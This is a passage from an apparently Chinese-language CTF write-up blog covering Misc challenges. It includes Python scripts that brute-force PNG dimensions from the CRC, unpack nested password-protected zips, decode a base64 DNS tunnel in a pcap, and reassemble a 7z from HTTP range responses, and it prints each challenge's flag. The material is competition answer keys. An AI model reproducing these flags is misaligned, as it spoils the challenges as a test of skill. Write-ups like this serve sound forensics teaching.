</span></span><span style="display:flex;"><span>    K2 <span style="color:#f92672">=</span> solve(plaintext2, miwen2)
</span></span><span style="display:flex;"><span>    K3 <span style="color:#f92672">=</span> solve(plaintext3, miwen3)
</span></span><span style="display:flex;"><span>    K4 <span style="color:#f92672">=</span> solve(plaintext4, miwen4)
</span></span><span style="display:flex;"><span>    K5 <span style="color:#f92672">=</span> solve(plaintext5, miwen5)
</span></span><span style="display:flex;"><span>    K <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (K1[i][j] <span style="color:#f92672">in</span> K2[i]) <span style="color:#f92672">and</span> (K1[i][j] <span style="color:#f92672">in</span> K3[i]) <span style="color:#f92672">and</span> (K1[i][j] <span style="color:#f92672">in</span> K4[i]) <span style="color:#f92672">and</span> (K1[i][j] <span style="color:#f92672">in</span> K5[i]):
</span></span><span style="display:flex;"><span>                print(i, j)
</span></span><span style="display:flex;"><span>                K <span style="color:#f92672">+=</span> K1[i][j]
</span></span><span style="display:flex;"><span>    print(K)
</span></span></code></pre></div><h2 id="misc">Misc</h2>
<h3 id="萌新在哪儿呢">[萌新]在哪儿呢</h3>
<p>PDF里面有很多不可见字符，直接复制粘贴到sublime里面就可以看到flag</p>
<p>flag{hey_there_is_no_thing}</p>
<h3 id="签到签到">[签到]签到</h3>
<p>题目描述，直接提交</p>
<h3 id="只是个png别想太多了png">只是个PNG，别想太多了.png</h3>
<p>拿到png，利用pngdebugger查，发现后面的块恢复成IDAT就行</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 49; 
			flex-basis: 118px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/PNG_crc.png" data-size="668x1348">
		<img src="/post/dnuictf-writeup-by-or4nge/PNG_crc.png"
			width="668"
			height="1348"
			srcset="/post/dnuictf-writeup-by-or4nge/PNG_crc_hu7fb44d12b693e56868c68a33699f3c3a_37698_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/PNG_crc_hu7fb44d12b693e56868c68a33699f3c3a_37698_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>crc不对，爆破长宽，抄了个大师傅的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;PNG.png&#39;</span> 
</span></span><span style="display:flex;"><span>fr <span style="color:#f92672">=</span> open(file,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> bytearray(fr[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">29</span>])
</span></span><span style="display:flex;"><span>crc32key <span style="color:#f92672">=</span> eval(str(fr[<span style="color:#ae81ff">29</span>:<span style="color:#ae81ff">33</span>])<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;b&#39;&#34;</span>,<span style="color:#e6db74">&#39;0x&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#39;</span>))
</span></span><span style="display:flex;"><span><span style="color:#75715e">#crc32key = 0xCBD6DF8A </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#data = bytearray(b&#39;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#39;) </span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">4095</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> w <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    width <span style="color:#f92672">=</span> bytearray(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;i&#39;</span>, w))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> h <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        height <span style="color:#f92672">=</span> bytearray(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;i&#39;</span>, h))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            data[x<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> width[x]
</span></span><span style="display:flex;"><span>            data[x<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> height[x]
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#print(data)</span>
</span></span><span style="display:flex;"><span>        crc32result <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>crc32(data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> crc32result <span style="color:#f92672">==</span> crc32key:
</span></span><span style="display:flex;"><span>            print(width,height)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            newpic <span style="color:#f92672">=</span> bytearray(fr)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>                newpic[x<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> width[x]
</span></span><span style="display:flex;"><span>                newpic[x<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> height[x]
</span></span><span style="display:flex;"><span>            fw <span style="color:#f92672">=</span> open(file<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.png&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)
</span></span><span style="display:flex;"><span>            fw<span style="color:#f92672">.</span>write(newpic)
</span></span><span style="display:flex;"><span>            fw<span style="color:#f92672">.</span>close
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># return None</span>
</span></span></code></pre></div><p>恢复后图片新增内容</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 131; 
			flex-basis: 314px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/PNG_new.png" data-size="1131x863">
		<img src="/post/dnuictf-writeup-by-or4nge/PNG_new.png"
			width="1131"
			height="863"
			srcset="/post/dnuictf-writeup-by-or4nge/PNG_new_hu2d235f97b6e27c4df5c516bd1837f970_346070_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/PNG_new_hu2d235f97b6e27c4df5c516bd1837f970_346070_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>看到多了一个压缩的部分，拿binwalk分了下，flag在后面的文件中</p>
<p>flag{zhe_ti_mu_ye_tai_bt_le_XD}</p>
<h3 id="压缩包压缩包压缩包压缩包">压缩包压缩包压缩包压缩包</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1000</span>):
</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;./&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    zfile <span style="color:#f92672">=</span> zipfile<span style="color:#f92672">.</span>ZipFile(name,<span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>    in_file <span style="color:#f92672">=</span> zfile<span style="color:#f92672">.</span>namelist()[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    passwd <span style="color:#f92672">=</span> in_file[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>    zfile<span style="color:#f92672">.</span>extract(in_file, <span style="color:#e6db74">&#39;./&#39;</span>,bytes(passwd,encoding <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ascii&#34;</span>))
</span></span><span style="display:flex;"><span>    zfile<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>remove(name)
</span></span></code></pre></div><p>解出23333.zip</p>
<p>密码根据规律猜测是3-6位，爆破得到756698是密码</p>
<p>010editor搜索flag得到flag</p>
<p>flag{Unz1p_i5_So_C00l##}</p>
<h3 id="range_download">range_download</h3>
<p>过滤dns报文，存在几条query name为xx.nss.neusoft.edu.cn的dns请求包，应该是base64编码的dns隧道，上脚本分析：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pyshark
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> pyshark<span style="color:#f92672">.</span>FileCapture(<span style="color:#e6db74">&#39;range.pcapng&#39;</span>,display_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dns and dns.flags==0x00000100 and dns.qry.name matches &#34;^[^.-]*\.nss.neusoft.edu.cn$&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>datas <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>ids <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pkt <span style="color:#f92672">in</span> cap:
</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> pkt<span style="color:#f92672">.</span>dns<span style="color:#f92672">.</span>qry_name
</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> pkt<span style="color:#f92672">.</span>dns<span style="color:#f92672">.</span>id
</span></span><span style="display:flex;"><span>    match <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;^([^.-]*)\.nss.neusoft.edu.cn$&#39;</span>, name)
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> match:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> match<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;error! &#39;</span> <span style="color:#f92672">+</span> name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> id <span style="color:#f92672">in</span> ids:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>    datas<span style="color:#f92672">.</span>append(data)
</span></span><span style="display:flex;"><span>    ids<span style="color:#f92672">.</span>append(id)
</span></span><span style="display:flex;"><span>line <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(datas)
</span></span><span style="display:flex;"><span>img <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(line<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>print(img)
</span></span><span style="display:flex;"><span>cap<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>跑出来是password: nss_yyds!</p>
<p>过滤http协议，全都是206 Partial Content，把flag.7z一个字节一个字节地传了过来，顺序是乱的，需要写脚本恢复。调试的时候发现基本每个字节都会被传输很多次，并且有一个字节没有被传输，这些在写脚本的时候都需要注意到。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pyshark
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> pyshark<span style="color:#f92672">.</span>FileCapture(<span style="color:#e6db74">&#39;range.pcapng&#39;</span>,display_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http and http.response.code == 206&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">2460</span>)
</span></span><span style="display:flex;"><span>poslist <span style="color:#f92672">=</span> [<span style="color:#66d9ef">False</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2460</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pkt <span style="color:#f92672">in</span> cap:
</span></span><span style="display:flex;"><span>	length <span style="color:#f92672">=</span> int(pkt<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>content_length)
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> pkt<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>file_data<span style="color:#f92672">.</span>binary_value
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> field <span style="color:#f92672">in</span> pkt<span style="color:#f92672">.</span>http<span style="color:#f92672">.</span>response_line<span style="color:#f92672">.</span>alternate_fields:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> field<span style="color:#f92672">.</span>showname_key <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Content-Range&#39;</span>:
</span></span><span style="display:flex;"><span>			pos_start <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>			pos_end <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>			contentRange <span style="color:#f92672">=</span> field<span style="color:#f92672">.</span>showname_value<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>)
</span></span><span style="display:flex;"><span>			match <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;bytes (\d+)-(\d+)/\d+&#39;</span>, contentRange)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> match:
</span></span><span style="display:flex;"><span>				pos_start <span style="color:#f92672">=</span> int(match<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>				pos_end <span style="color:#f92672">=</span> int(match<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">assert</span>(pos_end <span style="color:#f92672">-</span> pos_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> length)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(pos_start, pos_end<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> poslist[i] <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">assert</span>(data[i] <span style="color:#f92672">==</span> payload[i<span style="color:#f92672">-</span>pos_start])
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>						poslist[i] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>				data[pos_start:pos_end<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> payload
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>				print(<span style="color:#e6db74">&#39;Error! Range not found!&#39;</span>)
</span></span><span style="display:flex;"><span>				exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2460</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> poslist[i] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>		print(i)
</span></span><span style="display:flex;"><span>cap<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;flag.7z&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">.</span>write(data)
</span></span></code></pre></div><p>下标2349位置的字节未知，需要爆破一下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> py7zr
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> _lzma
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;flag.7z&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    source <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> bytearray(source)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Now: &#34;</span><span style="color:#f92672">+</span>str(i))
</span></span><span style="display:flex;"><span>        data[<span style="color:#ae81ff">2349</span>] <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">.7z&#39;</span><span style="color:#f92672">%</span>(i),<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f1:
</span></span><span style="display:flex;"><span>            f1<span style="color:#f92672">.</span>write(data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> py7zr<span style="color:#f92672">.</span>SevenZipFile(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">.7z&#39;</span><span style="color:#f92672">%</span>(i), <span style="color:#e6db74">&#39;r&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nss_yyds!&#39;</span>) <span style="color:#66d9ef">as</span> archive:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> archive<span style="color:#f92672">.</span>test() <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span> <span style="color:#f92672">or</span> archive<span style="color:#f92672">.</span>test() <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#39;Found:&#39;</span> <span style="color:#f92672">+</span> str(i))
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">.7z&#39;</span><span style="color:#f92672">%</span>(i))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> (py7zr<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>Bad7zFile, _lzma<span style="color:#f92672">.</span>LZMAError) <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(e)
</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">.7z&#39;</span><span style="color:#f92672">%</span>(i))
</span></span></code></pre></div><p>运行结果是194，将flag194.7z解压得到flag.png</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 100; 
			flex-basis: 240px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/range_download_qrcode.png" data-size="385x385">
		<img src="/post/dnuictf-writeup-by-or4nge/range_download_qrcode.png"
			width="385"
			height="385"
			srcset="/post/dnuictf-writeup-by-or4nge/range_download_qrcode_hu64278edc3cde930e526f8461766b2668_2247_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/range_download_qrcode_hu64278edc3cde930e526f8461766b2668_2247_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>解码为5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d</p>
<p>ciphey一把梭：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 394; 
			flex-basis: 947px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/range_download_decode.png" data-size="1082x274">
		<img src="/post/dnuictf-writeup-by-or4nge/range_download_decode.png"
			width="1082"
			height="274"
			srcset="/post/dnuictf-writeup-by-or4nge/range_download_decode_hu8799db84a95c69dc76d36555839d8d57_40648_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/range_download_decode_hu8799db84a95c69dc76d36555839d8d57_40648_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>flag{6095B134-5437-4B21-BE52-EDC46A276297}</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/%E6%9A%97%E6%B3%89%E6%9D%AF/">暗泉杯</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/re/">Re</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/crypto/">Crypto</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="">
    <a href="/post/bluehat-final-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">2021蓝帽杯决赛 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/xhlj-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">西湖论剑 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#签到flag">[签到]flag</a></li>
        <li><a href="#萌odd_upload">[萌]odd_upload</a></li>
        <li><a href="#easyinject">easyinject</a></li>
        <li><a href="#hideandseek">*hideandseek</a></li>
        <li><a href="#wschat">*wschat</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#签到nssshop">[签到]NssShop</a></li>
        <li><a href="#justdoit">justdoit</a></li>
        <li><a href="#reallneedgoodluck">reallNeedGoodLuck</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#签到signin">[签到]Signin</a></li>
        <li><a href="#萌新happyctf">[萌新]happyCTF</a></li>
        <li><a href="#remember-crypt-4">Remember Crypt 4</a></li>
        <li><a href="#easyre">EasyRe</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
